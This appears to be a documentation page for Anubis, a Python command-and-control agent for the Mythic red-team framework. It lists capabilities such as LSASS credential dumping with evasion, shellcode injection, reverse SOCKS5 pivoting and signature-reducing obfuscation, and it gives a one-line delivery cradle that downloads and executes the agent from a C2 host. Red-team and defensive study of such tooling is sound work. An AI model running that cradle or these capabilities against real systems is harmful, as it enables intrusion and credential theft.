+++
title = "Anubis"
chapter = false
weight = 5
+++

![logo](/agents/anubis/Anubis.svg?width=200px)

## Summary

Anubis is a cross-platform Python C2 agent for the Mythic framework, supporting Python 3.8 on Windows, Linux, and macOS. It implements AES-256-CBC + HMAC-SHA256 encrypted communications over HTTP, with optional XOR+Base64 obfuscation of the payload script at build time.

Inspired by the Egyptian god of the dead and guardian of passages, Anubis operates discreetly between target and operator — establishing reliable C2 channels in Red Team and adversary simulation engagements.

### Highlighted Agent Features

- **Encrypted comms**: AES-256-CBC with HMAC-SHA256 integrity verification (pure Python stdlib implementation — no external crypto library required by default).
- **Dynamic loading**: Commands can be loaded and unloaded at runtime via the C2 channel, limiting on-disk exposure.
- **SOCKS5 proxy**: Full reverse SOCKS5 tunnel through the C2 channel for lateral movement and pivoting.
- **Chunked file transfer**: Upload and download with configurable chunk size (default 51200 bytes), stoppable mid-transfer.
- **Windows offensive capabilities**: LSASS fork dump (NtCreateProcessEx evasion), shellcode injection, DLL loading, process enumeration, screenshot capture (pure ctypes, no pywin32 or Pillow).
- **Cloudflare tunnel support**: URL-safe base64 encoding for GET parameters; works through Cloudflare-proxied endpoints.
- **Obfuscation**: Optional XOR + Base64 encoding of the entire agent script at build time.
- **Jitter**: Symmetric sleep jitter to reduce predictable beacon intervals.

With the ability to execute arbitrary code on the command line, a basic delivery cradle can be used:

```bash
python3 -c "import urllib.request; exec(urllib.request.urlopen('https://[C2_HOST]/anubis.py').read())"
```

### Build Options

#### Python Version
Select Python 3.8 (recommended for Windows) or Python 2.7 (legacy macOS/Linux).

#### Output Format
- `py` — plain Python script
- `base64` — Base64-encoded blob, suitable for one-liner delivery

#### Cryptography Library
- `No` (default) — uses the built-in pure-Python AES implementation (no external dependencies required on target)
- `Yes` — uses the `cryptography` pip library (faster, but requires the package to be installed on the target)

{{% notice info %}}
Either option provides full encrypted comms. The choice only affects the implementation method, not the security level.
{{% /notice %}}

#### Obfuscate Script
XOR-encrypts the agent with a random key and wraps it in a Base64+exec loader. Reduces static signature coverage.

#### Verify HTTPS Certificate
Set to `No` to skip TLS certificate verification (required when using self-signed certs or Cloudflare tunnels).

### Installation

```bash
sudo ./mythic-cli install github https://github.com/wtechsec/Anubis.git
```

### Important Notes

- Each task runs in a dedicated thread; long-running jobs are tracked with `jobs` and stopped with `jobkill`.
- The agent re-attempts check-in automatically after consecutive C2 failures.
- `dump_lsass` requires an elevated agent with SeDebugPrivilege. The command automatically attempts privilege escalation via `RtlAdjustPrivilege` and SYSTEM token impersonation as fallback.
- `screenshot2` and `shinject` use pure `ctypes` — no external dependencies required on the target.

---

## Resumo em Português (PT-BR)

Anubis é um agente C2 Python para o framework Mythic, com suporte a Python 3.8 em Windows, Linux e macOS. Implementa comunicação cifrada AES-256-CBC + HMAC-SHA256 sobre HTTP, com obfuscação opcional XOR+Base64 do script no build.

### Funcionalidades principais

- Comunicação cifrada sem dependências externas (AES puro em Python stdlib)
- Carregamento dinâmico de comandos em runtime via canal C2
- Proxy SOCKS5 reverso para pivoting e movimentação lateral
- Transferência de arquivos em chunks, interrompível
- Capacidades ofensivas Windows: dump LSASS por fork (evasão via NtCreateProcessEx), injeção de shellcode, carregamento de DLL, enumeração de processos, captura de tela (ctypes puro)
- Suporte a tunnel Cloudflare
- Jitter simétrico no beacon

## Authors

- @wtechsec — Willian Oliveira / Escola Hack3r
